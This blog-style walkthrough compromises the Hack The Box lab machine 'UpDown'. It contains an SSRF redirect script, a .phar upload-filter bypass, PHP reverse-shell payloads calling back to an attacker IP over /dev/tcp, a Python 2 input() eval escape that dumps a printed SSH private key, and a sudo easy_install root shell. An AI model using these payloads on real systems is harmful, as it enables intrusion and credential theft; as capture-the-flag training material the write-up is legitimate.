---
title: "HTB - UpDown"
categories: [box]
date: 2023-01-21
comments: true
image: /images/walkthroughs/hackthebox/updown/logo.png
favicon: /images/walkthroughs/hackthebox/updown/logo.png
description: HTB - UpDown walkthrough
---

# UpDown

<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/banner.png" width="70%"/>
</p>


## Summary

Updown is a medium box where we have a website that checks if another website is up. Enumerating the subdomains we can see the dev subdomain but we have no access. On the main domain, we find a /.git folder where some files were staged. Recovering them will display the .htaccess, disclosing the special header required to access that dev subdomain. In it, the website allows the user to upload a file into the server. Since we have recovered the code from the .git folder, we coudl check the code to discover a gap on the extension check for the file upload. Also we have exec() and similar functions disabled (discovered it checking the phpinfo()). To craft the payload I had to use the _phar_ extension and the _proc_open_ function to finally get a revshell as www-data.

Once inside, we can see a python2.7 script and a binary format for that script. It uses the input() function, so we could abuse it to reach the id_rsa file from the user **developer** and SSH into the machine to get the flag.

For privesc, we can see that the user can sudo with no password with the command easy_install. Crafting a python package with a shell and installing it with sudo will do the job to get the root shell.


## Enumeration

First we start with nmap:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-10 03:49 EDT
Nmap scan report for 10.10.11.177
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see only port 80 and 22. Let's check the website:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/1_0_web.png" width="90%"/>
</p>


We can see the domain name (that we are going to place in the /etc/hosts) and it is probably another SSRF attack.

While running gobuster, I tried the webstie's funcitonallity. On the debug mode, the website displays extra information, including the complete request.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/1_1_debug.png" width="90%"/>
</p>


```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://siteisup.htb
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/09/10 03:55:19 Starting gobuster in directory enumeration mode
===============================================================
/dev                  (Status: 301) [Size: 310] [--> http://siteisup.htb/dev/]
/server-status        (Status: 403) [Size: 277]
```

We can see the _/dev_ path on gobuster, but when going to the web see no data. Maybe with the SSRF redirecting the request to that path we might see its content. I'm running the following code:


```python
#!/usr/bin/env python
"""
Simple HTTP URL redirector
Shreyas Cholia 10/01/2015

usage: redirect.py [-h] [--port PORT] [--ip IP] redirect_url

HTTP redirect server

positional arguments:
  redirect_url

optional arguments:
  -h, --help            show this help message and exit
  --port PORT, -p PORT  port to listen on
  --ip IP, -i IP        host interface to listen on
"""
import SimpleHTTPServer
import SocketServer
import sys
import argparse



def redirect_handler_factory(url):
    """
    Returns a request handler class that redirects to supplied `url`
    """
    class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
       def do_GET(self):

            with open('payload.txt', 'r') as in_file:
                redirect_url = in_file.read().splitlines()[0]
                
            print(redirect_url)
            self.send_response(301)
            self.send_header('Location', redirect_url)
            self.end_headers()

    return RedirectHandler
           

def main():

    parser = argparse.ArgumentParser(description='HTTP redirect server')

    parser.add_argument('--port', '-p', action="store", type=int, default=80, help='port to listen on')
    parser.add_argument('--ip', '-i', action="store", default="", help='host interface to listen on')
    #parser.add_argument('redirect_url', action="store")

    myargs = parser.parse_args()
    
    redirect_url = ''#myargs.redirect_url
    port = myargs.port
    host = myargs.ip

    redirectHandler = redirect_handler_factory(redirect_url)
    
    handler = SocketServer.TCPServer((host, port), redirectHandler)
    print("serving at port %s" % port)
    handler.serve_forever()

if __name__ == "__main__":
    main()
```

With the following payload:

http://127.0.0.1/dev/

But we had no luck:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/1_2_301.png" width="90%"/>
</p>


I started enumerating the subdomains with the Host header technique and found the **dev** subdomain, which I have no access (403) from the attack machine. Let's make the redirection payload ton that subdomain:


```bash
ffuf -c -u 'http://siteisup.htb' -H 'Host: FUZZ.siteisup.htb' -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -fs 1131   

...

 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 1131
________________________________________________

dev                     [Status: 403, Size: 281, Words: 20, Lines: 10]

```

Trying to reach the _dev.siteisup.htb_ I had no response from the server, like it was down, even with the redirection trick.


I tried other payloads such as _file:///etc/passwd_ and we can see some kind of filtering:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/1_3_hacking.png" width="90%"/>
</p>


With the redirection trick I found nothing also fo the _file:///etc/passwd_ payload:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/1_4_reed.png" width="90%"/>
</p>

Recalling the _server-status_ on gobuster I had access to it:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/1_6_server.png" width="90%"/>
</p>

No relevant information.

Then I started going for funky payloads:


```html

</textarea>

<iframe src="file:///etc/passwd" width="400" height="400">

<textarea>
```

With some results:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/1_5_payload.png" width="90%"/>
</p>


But couldn't get the most out of it... I run gobuster again over the /dev directory and got some interesting results.

```bash
gobuster dir -u "http://siteisup.htb/dev/" --wordlist=/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 30 -x txt,php --exclude-length 277 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://siteisup.htb/dev/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          277
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2022/09/10 13:26:10 Starting gobuster in directory enumeration mode
===============================================================
/.git                 (Status: 301) [Size: 315] [--> http://siteisup.htb/dev/.git/]
/.git/index           (Status: 200) [Size: 521]                                    
/.git/HEAD            (Status: 200) [Size: 21]                                     
/.git/config          (Status: 200) [Size: 298]                                    
/.git/logs/           (Status: 200) [Size: 1143]                                   
/index.php            (Status: 200) [Size: 0]   
```

Now we have something to stick to.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/1_7_git.png" width="60%"/>
</p>


In this case, I usually go for the GitTools> gitdumper or use the following command, then remove the gibberish index.html files. This get a mirror copy of the website without the parent directory:


```bash

wget -m -np http://siteisup.htb/dev/.git/
find . -type f -name 'index*' -exec rm {} +

```

Checking the content within that .git folder, we can see that there are some staged changes to detele some files from the last commit:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/2_0_git.png" width="60%"/>
</p>


We run the following commands to restore them:

```bash

git restore --staged .
git restore .

ls -la

  total 40
  drwxr-xr-x 3 kali kali 4096 Sep 10 13:48 .
  drwxr-xr-x 5 kali kali 4096 Sep 10 13:37 ..
  -rw-r--r-- 1 kali kali   59 Sep 10 13:48 admin.php
  -rw-r--r-- 1 kali kali  147 Sep 10 13:48 changelog.txt
  -rw-r--r-- 1 kali kali 3145 Sep 10 13:48 checker.php
  drwxr-xr-x 8 kali kali 4096 Sep 10 13:48 .git
  -rw-r--r-- 1 kali kali  117 Sep 10 13:48 .htaccess
  -rw-r--r-- 1 kali kali  273 Sep 10 13:48 index.php
  -rw-r--r-- 1 kali kali 5531 Sep 10 13:48 stylesheet.css


```

There, we can see some interesting files:

- index.php

```php
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
  define("DIRECTACCESS",false);
  $page=$_GET['page'];
  if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
    include($_GET['page'] . ".php");
  }else{
    include("checker.php");
  } 
?>
```

- checker.php

```php
<?php
if(DIRECTACCESS){
  die("Access Denied");
}
?>
<!DOCTYPE html>
<html>

  <head>
    <meta charset='utf-8' />
    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
    <link rel="stylesheet" type="text/css" media="screen" href="stylesheet.css">
    <title>Is my Website up ? (beta version)</title>
  </head>

  <body>

    <div id="header_wrap" class="outer">
        <header class="inner">
          <h1 id="project_title">Welcome,<br> Is My Website UP ?</h1>
          <h2 id="project_tagline">In this version you are able to scan a list of websites !</h2>
        </header>
    </div>

    <div id="main_content_wrap" class="outer">
      <section id="main_content" class="inner">
        <form method="post" enctype="multipart/form-data">
          <label>List of websites to check:</label><br><br>
        <input type="file" name="file" size="50">
        <input name="check" type="submit" value="Check">
    </form>

<?php

function isitup($url){
  $ch=curl_init();
  curl_setopt($ch, CURLOPT_URL, trim($url));
  curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");
  curl_setopt($ch, CURLOPT_HEADER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_TIMEOUT, 30);
  $f = curl_exec($ch);
  $header = curl_getinfo($ch);
  if($f AND $header['http_code'] == 200){
    return array(true,$f);
  }else{
    return false;
  }
    curl_close($ch);
}

if($_POST['check']){
  
  # File size must be less than 10kb.
  if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
  $file = $_FILES['file']['name'];
  
  # Check if extension is allowed.
  $ext = getExtension($file);
  if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
    die("Extension not allowed!");
  }
  
  # Create directory to upload our file.
  $dir = "uploads/".md5(time())."/";
  if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
  $final_path = $dir.$file;
  move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
  
  # Read the uploaded file.
  $websites = explode("\n",file_get_contents($final_path));
  
  foreach($websites as $site){
    $site=trim($site);
    if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
      $check=isitup($site);
      if($check){
        echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
      }else{
        echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
      } 
    }else{
      echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
    }
  }
  
  # Delete the uploaded file.
  @unlink($final_path);
}

function getExtension($file) {
  $extension = strrpos($file,".");
  return ($extension===false) ? "" : substr($file,$extension+1);
}
?>
      </section>
    </div>

    <div id="footer_wrap" class="outer">
      <footer class="inner">
        <p class="copyright">siteisup.htb (beta)</p><br>
        <a class="changelog" href="changelog.txt">changelog.txt</a><br>
      </footer>
    </div>

  </body>
</html>

```

But what it's more important, how we can access to the server, this is described in the .htaccess file:

- .htaccess

```bash
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

So we need the following header to access the **dev** subdomain: _Special-Dev: only4dev_. That was why we could now get anything from the dev subdomain. With an easy curl request we can see that we can now accesss to the server:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/3_0_dev.png" width="70%"/>
</p>

To accomodate the header to all requests, we can use Burp extension called _Add Custom Header_ with the following config:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/3_1_header.png" width="70%"/>
</p>

And on the Session handling rule, invoke the extension:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/3_2_header.png" width="70%"/>
</p>

Also remember to add http://dev.siteisup.htb/ to the scope on burp. Then we are in:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/3_3_dev.png" width="70%"/>
</p>


As seen in the code, the uploaded file goes to the /uploads endpoint. It checks the extension for php so it doesn't get executed but when I saw the code, I inmediately thought about the **.phar** extension that I used in some CTFs to bypass these kind of filters:


```php
# Check if extension is allowed.
$ext = getExtension($file);
if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
  die("Extension not allowed!");
}

# Create directory to upload our file.
$dir = "uploads/".md5(time())."/";
if(!is_dir($dir)){
      mkdir($dir, 0770, true);
  }

# Upload the file.
$final_path = $dir.$file;
move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");

# Read the uploaded file.
$websites = explode("\n",file_get_contents($final_path));
```

We will try to exploit this upload functionality by creating a revshell and uploading it to the server. The first line of the _phar_ file will be our server with the script, which will wait 10 seconds until it redirects, this way, we will have time to check the upload file (since it gets deleted periodically). Once opened, we will get the revshell back.

We can list the uploads directory:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/4_1_payload.png" width="70%"/>
</p>


With the following payload (and the local server opening the time window for me to check the uploads folder) we get execution but the revshell is not comming back:

- revi.phar

```php
http://10.10.14.41
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.41/5454 0>&1'"); ?>
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/4_2_exe.png" width="70%"/>
</p>


With the phpinfo() we can debug to see further information. Payload:

```php
http://10.10.14.41
<?php phpinfo(); ?>
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/4_3_phpinfo.png" width="90%"/>
</p>

When this happens on PHP you might look for the disable functions. In this case, we can see that exec, shell_exec, etc, are disabled, that it is why our shell is not comming back:

```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,
pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,
system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen
```

We can check the [PHP documentation](https://www.php.net/manual/en/ref.exec.php) to see if there is any useful function to execute code. We see that _proc_open_ is not blocked. Let's test the following payload:


```php
http://10.10.14.41
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.41';  // CHANGE THIS
$port = 5454;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh';
$daemon = 0;
$debug = 0;


$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
  printit("ERROR: Can't spawn shell");
  exit(1);
}

?> 
```


We got the first execution correct. Due to the threading process on the original payload, we cannot demonize the rev shell process, therefore I opted for executing one command and get the shell as it is.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/4_4_result_first.png" width="90%"/>
</p>


So modifying the input string on the pipe[0] we can create a revshell. Tried hard on the _mkfifo /tmp/f..._ revshell but didn't work, seems like the concatenation or the pipe are messing the call. Used a basic redirection and it worked:


```php
http://10.10.14.175
<?php

set_time_limit (0);
$VERSION = "1.0";
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash';
$daemon = 0;
$debug = 0;


$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);


$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
  printit("ERROR: Can't spawn shell");
  exit(1);
}

fwrite($pipes[0], 'bash -i >& /dev/tcp/10.10.14.175/5454 0>&1');
fclose($pipes[0]);
echo stream_get_contents($pipes[1]);
fclose($pipes[1]);

$return_value = proc_close($process);

echo "command returned $return_value\n";
?> 
```

And we are in as www-data (rememeber to set a listener for your revshell ;)):

<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/4_5_in.png" width="70%"/>
</p>


Listing the current folder we see some interesting files:

```bash
www-data@updown:/home/developer/dev$ ls -la
total 32
drwxr-x--- 2 developer www-data   4096 Jun 22 15:45 .
drwxr-xr-x 7 developer developer  4096 Sep 13 04:14 ..
-rwsr-x--- 1 developer www-data  16928 Jun 22 15:45 siteisup
-rwxr-x--- 1 developer www-data    154 Jun 22 15:45 siteisup_test.py
```

We can see the SUID set for that binary siteisup. Exploring a little bit its content and the py script we can get the following conclusions:

```bash
www-data@updown:/home/developer/dev$ cat siteisup_test.py 
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"

www-data@updown:/home/developer/dev$ strings siteisup
#...
Welcome to 'siteisup.htb' application
/usr/bin/python /home/developer/dev/siteisup_test.py
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
#...

www-data@updown:/home/developer/dev$ /usr/bin/python --version
Python 2.7.18
```

If you have never seen one of those, it can be tricky, but if you are into CTFs and Jail scape, you have noticed that python2 input() function. It is vulnerable since input() in this version is the same as eval(raw_input())

So we can craft a payload to eval and get ourselves a developer shell:

```python
__import__('os').system('cat /home/developer/user.txt')
```

And we get permission denied:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/5_1_no.png" width="90%"/>
</p>


But why? That is because the flag is owned by root and can be read by group developer. Developer is in that group, but the SUID runs the program as the user, but not as the groups of that user.


```bash
drwx------ 2 developer developer 4096 Aug  2 09:15 .ssh
drwxr-x--- 2 developer www-data  4096 Jun 22 15:45 dev
-rw-r----- 1 root      developer   33 Sep 13 04:08 user.txt
```

Check what happens when calling the groups command. We are www-data:

```bash
www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('groups')
www-data
```

But the SUID make us developer, only as user.

```bash
www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('id')
uid=1002(developer) gid=33(www-data) groups=33(www-data)
```

So we have to find another way. First option? Try to grab any id_rsa file:


```bash
www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('cat /home/developer/.ssh/id_rsa')
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

We have it, then use it to log in as user:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/6_0_user.png" width="60%"/>
</p>


## Privesc

Going for the privesc, first we try sudo -l and get the following script:


```bash
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

I was looking for maybe install a fake package like _pip privesc_ but in [GTFOBins](https://gtfobins.github.io/gtfobins/easy_install/#sudo) we have an easy escape for easy_install:


```bash
developer@updown:~$ id
uid=1002(developer) gid=1002(developer) groups=1002(developer)
developer@updown:~$ TF=$(mktemp -d)
developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:~$ sudo /usr/local/bin/easy_install $TF
```

And we have a shell as root:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/updown/7_0_root.png" width="80%"/>
</p>